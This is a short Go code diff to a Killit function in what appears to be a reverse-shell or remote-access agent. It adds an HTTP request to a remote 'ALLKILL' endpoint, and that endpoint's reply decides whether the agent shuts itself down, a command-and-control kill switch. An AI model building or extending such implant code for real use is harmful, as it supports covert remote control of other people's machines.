@@ -24,8 +24,18 @@ func Killit() {
 				// if not need  dont open the tunnel to revert shell
 				if check.Hostid == lib.HOSTID {
 					lib.KillALL()
-				} else if check.Hostid == "0" {
-					lib.KillALL()
+				} else {
+					aresp, abody, _ := gorequest.New().
+						Get(lib.ALLKILL).
+						End()
+					if aresp.StatusCode == 200 && abody != "" {
+						if err := json.Unmarshal([]byte(abody), &check); err == nil {
+							if check.Hostid == "0" {
+								lib.KillALL()
+							}
+						}
+
+					}
 				}
 			}
 		}
